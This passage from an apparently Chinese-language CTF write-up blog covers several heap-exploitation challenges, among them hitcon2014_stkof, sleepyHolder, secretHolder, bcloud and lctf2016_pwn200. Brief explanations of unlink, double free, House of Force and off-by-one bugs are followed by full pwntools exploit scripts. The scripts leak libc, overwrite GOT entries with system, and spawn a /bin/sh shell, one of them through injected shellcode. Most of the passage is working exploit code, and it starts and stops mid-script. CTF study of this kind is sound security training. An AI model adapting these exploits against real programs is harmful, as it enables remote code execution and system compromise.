class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># 0xc from 1, then 0xc from 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><p>本题共四个功能：添加、读入内容、删除、显示。其中读入内容存在堆溢出，我们可以利用这个溢出实现unlink攻击。程序中存在全局数组<code>bag</code>，存放所有chunk的mem指针。</p>
<p>先申请3个chunk，其中第1个chunk没有用，只是因为前两个chunk不连续所以才申请的。随后通过chunk2溢出到chunk3进行unlink攻击，这样修改<code>bag[2]</code>等价于修改<code>bag[-1]</code>，填充掉<code>bag[-1]</code>和<code>bag[0]</code>后，令：</p>
<ul>
<li><code>bag[1] = elf.got[&#39;free&#39;]</code></li>
<li><code>bag[2] = elf.got[&#39;fflush&#39;]</code>，<code>fflush</code>可以是任意已调用的libc函数</li>
<li><code>bag[3] = elf.got[&#39;atoi&#39;]</code></li>
</ul>
<p>此时我们<code>edit(1)</code>写入<code>elf.plt[&#39;puts&#39;]</code>即可劫持<code>free</code>函数到<code>puts</code>，那么调用<code>delete(2)</code>就会打印出<code>fflush</code>地址，从而泄露libc。最后<code>edit(3)</code>写入<code>system</code>地址，劫持<code>atoi</code>到<code>system</code>，这是因为在程序读入指令时会调用<code>atoi(&amp;nptr)</code>，我们输入的<code>nptr</code>只需要是<code>/bin/sh</code>即可getshell。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	s(content)</span><br><span class="line">	ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bag = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">fd = bag+<span class="number">0x10</span><span class="number">-0x18</span></span><br><span class="line">bk = bag+<span class="number">0x10</span><span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x80</span>,fd,bk).ljust(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += flat(<span class="number">0x80</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bag[2] &lt;-&gt; bag[-1]</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,elf.got[<span class="string">&#x27;free&#x27;</span>],elf.got[<span class="string">&#x27;fflush&#x27;</span>],elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># puts(GOT[fflush])</span></span><br><span class="line">ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">fflush = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;fflush&#x27;</span>,fflush)</span><br><span class="line">system,binsh = ret2libc(fflush,<span class="string">&#x27;fflush&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="sleepyHolder-hitcon-2016"><a href="#sleepyHolder-hitcon-2016" class="headerlink" title="sleepyHolder_hitcon_2016"></a>sleepyHolder_hitcon_2016</h2><p>这道题允许保存small/big/huge secret，其中huge只能保存一次，不能删除和修改，并且在保存了一个small/big之后就不能再保存新的small/big了，只能renew。</p>
<p>显然这个huge就是我们漏洞利用的核心。实际上，huge的范围属于large bin，在申请这么大的chunk时如果unsorted bin中没有满足条件的，就会触发<code>malloc_consolidate()</code>，使fastbin中的chunk合并进入unsorted bin，最终根据合并后的大小进入small bin或large bin。那么我们不妨先申请一个small，然后申请big防止small被释放时与top chunk合并，再释放small。此时small进入fastbin，再申请huge即可让small进入到small bin。</p>
<p>由于这时small已经不处于fastbin链表头了，所以再次释放并不会出错，造成double free。这样之后在small内伪造chunk并unlink劫持GOT表即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1-&gt;fastbin</span></span><br><span class="line">add(<span class="number">3</span>) <span class="comment"># consolidate,1-&gt;unsorted bin-&gt;smallbin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">small_secret = <span class="number">0x6020d0</span></span><br><span class="line">fd = small_secret - <span class="number">0x18</span></span><br><span class="line">bk = small_secret - <span class="number">0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?,big,huge,small,big_flag,huge_flag,small_flag</span></span><br><span class="line">payload = flat(<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># free -&gt; puts</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h2 id="secretHolder-hitcon-2016"><a href="#secretHolder-hitcon-2016" class="headerlink" title="secretHolder_hitcon_2016"></a>secretHolder_hitcon_2016</h2><p>类似上一题，不过huge可以修改和删除了。由于huge非常大，分配时会调用<code>mmap()</code>，但是当释放掉huge再申请时，<code>mmap_threshold</code>已经变得和huge一样大，此时分配huge使用的是<code>brk()</code>，因此huge被分配到了堆上。</p>
<p>利用这个特性，我们可以先令small和huge地址重合，随后在下面垫上big。在small里伪造堆块并释放big，触发unlink，剩余的工作就和上一题一模一样了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">	sa(<span class="string">&#x27;: \n&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Huge secret&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">	sa(<span class="string">&#x27;: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># mmap threshold +++</span></span><br><span class="line">add(<span class="number">3</span>) <span class="comment"># brk()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># small &lt;-&gt; huge</span></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">small = <span class="number">0x6020b0</span></span><br><span class="line">fd = small<span class="number">-0x18</span></span><br><span class="line">bk = small<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0x21</span>,fd,bk,<span class="number">0x20</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">payload += flat(<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?,big,huge,small,big_flag,huge_flag,small_flag</span></span><br><span class="line">payload = flat(<span class="number">0</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment"># free -&gt; puts</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>在读入名字和读入Org以及Host时，均存在同样的<code>strcpy</code>漏洞，前者导致泄露堆地址，而后者允许我们off-by-one修改top chunk的大小，从而实现House of Force。通过gdb调试得到<code>top_chunk = heap + 0xd0</code>，那么构造的<code>evil_size</code>就是我们想分配到的<code>note_len</code>数组地址减去header的0x8，减去<code>old_top_chunk</code>地址，再减去12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了4B。最后从<code>note_len</code>覆盖到<code>note</code>数组，劫持<code>free</code>到<code>printf</code>泄露libc，再劫持<code>atoi</code>到<code>system</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:\n&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap = uu32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">sla(<span class="string">&#x27;Host:\n&#x27;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">note_len = <span class="number">0x804b0a0</span></span><br><span class="line">note = <span class="number">0x804b120</span></span><br><span class="line">top_chunk = heap + <span class="number">0xd0</span></span><br><span class="line">evil_size = note_len<span class="number">-0x8</span>-top_chunk<span class="number">-0xc</span> <span class="comment"># gdb</span></span><br><span class="line">add(evil_size,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">payload = flat((note-note_len)*<span class="string">&#x27;a&#x27;</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>],elf.got[<span class="string">&#x27;free&#x27;</span>],elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># printf(atoi.got)</span></span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p32(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h2><p>首先不难发现读入<code>name</code>时存在off-by-one，可以借此泄露栈地址。为了后面ret2shellcode，我们可以先在<code>name</code>里顺便写好shellcode：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;u?\n&#x27;</span>,payload)</span><br><span class="line">ru(payload)</span><br><span class="line">rbp = uu64(ru(<span class="string">&#x27;, w&#x27;</span>,<span class="literal">True</span>))</span><br><span class="line">leak(<span class="string">&#x27;rbp&#x27;</span>,rbp)</span><br></pre></td></tr></table></figure>

<p>而读入<code>money</code>时，恰好可以覆盖到堆指针<code>dest</code>。那么可以覆盖<code>dest</code>为我们伪造的chunk，同时准备好<code>id</code>（只需要大于0x10小于0x21000即可）作为<code>nextsize</code>，这样就可以先释放再申请这个fake chunk，就可以控制rip了，最后覆盖rip为shellcode地址。</p>
<p>通过gdb调试，可以绘制大致的栈结构图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> ------------ &lt;- leaked rbp</span><br><span class="line">|            | 0x20</span><br><span class="line"> ------------ &lt;- rbp</span><br><span class="line">| shellcode  | 0x30</span><br><span class="line"> ------------ &lt;- shellcode_addr  --</span><br><span class="line">| 0x20       | id                 |</span><br><span class="line"> ------------                     |</span><br><span class="line">|            |                    |</span><br><span class="line"> ------------                     |</span><br><span class="line">| rip        |                    | 0x40</span><br><span class="line"> ------------                     |</span><br><span class="line">| rbp        |                    |</span><br><span class="line"> ------------                     |</span><br><span class="line">| dest       |                    |</span><br><span class="line"> ------------ &lt;- fake            --</span><br><span class="line">| 0x41       |</span><br><span class="line"> ------------</span><br><span class="line">| prev_size  |</span><br><span class="line"> ------------</span><br><span class="line">| ...        |</span><br></pre></td></tr></table></figure>

<p>由此可以得到：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc = rbp<span class="number">-0x50</span></span><br><span class="line">fake = rbp<span class="number">-0x90</span></span><br></pre></td></tr></table></figure>

<p>从而伪造堆块：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;id ~~?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sa(<span class="string">&#x27;money~\n&#x27;</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+flat(<span class="number">0</span>,<span class="number">0x41</span>,<span class="number">0</span>,fake))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>) <span class="comment"># free</span></span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>) <span class="comment"># malloc</span></span><br><span class="line">sla(<span class="string">&#x27;long?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x30</span>)) <span class="comment"># + 0x10 = 0x40</span></span><br><span class="line">ru(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">sl(flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,sc))</span><br><span class="line">sla(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h2><p>添加note时，存在整数溢出漏洞，导致添加大小为0的note，可以输入的长度为无符号的<code>-1</code>，可以认为没有限制，但是<code>malloc</code>依旧会分配<code>0x20</code>字节。利用这个堆溢出，我们先分配三个chunk：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">| ...               |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*8             |               |</span><br><span class="line"> ------------------- &lt;- ptr[2]    chunk2</span><br><span class="line">| size&#x3D;0x91         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br><span class="line">|                   |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*8             |               |</span><br><span class="line"> ------------------- &lt;- ptr[1]    chunk1</span><br><span class="line">| size&#x3D;0x20         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br><span class="line">|                   | 0x18          |</span><br><span class="line"> -------------------                |</span><br><span class="line">| bp_prev_size&#x3D;0x60 |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| &#39;a&#39;*0x40          | 0x40          |</span><br><span class="line"> -------------------                |</span><br><span class="line">| fd     | bk       | 0x10          |</span><br><span class="line"> -------------------              chunk0</span><br><span class="line">| fake_size&#x3D;0x61    |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| fake_prev_size&#x3D;0  |               |</span><br><span class="line"> ------------------- &lt;- ptr[0]      |</span><br><span class="line">| size&#x3D;0x91         |               |</span><br><span class="line"> -------------------                |</span><br><span class="line">| prev_size         |               |</span><br><span class="line"> ------------------- &lt;---------------</span><br></pre></td></tr></table></figure>


<p>我们在0x80的<code>chunk0</code>内伪造了0x61的chunk，并通过<code>bp_prev_size=0x60</code>确保能通过检查。随后分配大小为<code>0</code>的<code>chunk1</code>（实际大小为0x20），由于整数溢出这里可以输入无限长度的内容，最后分配0x80的<code>chunk2</code>用来引起<code>unlink</code>。</p>
<p>接下来释放1再拿回来，就可以溢出到<code>chunk2</code>，修改其<code>prev_size</code>和<code>chunk_size</code>，前者修改为<code>0x20+0x80=0xa0</code>，后者置<code>PREV_IN_USE</code>位为<code>0</code>。这样再释放2就可以<code>unlink</code>掉我们的fake chunk了。此时<code>ptr</code>指向<code>ptr-0x18</code>，填充0x18字节后即可修改<code>ptr[0]</code>，之后就是常规GOT劫持了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;128)&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,choice,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;]&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;address:&#x27;</span>,<span class="string">&#x27;privacy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr 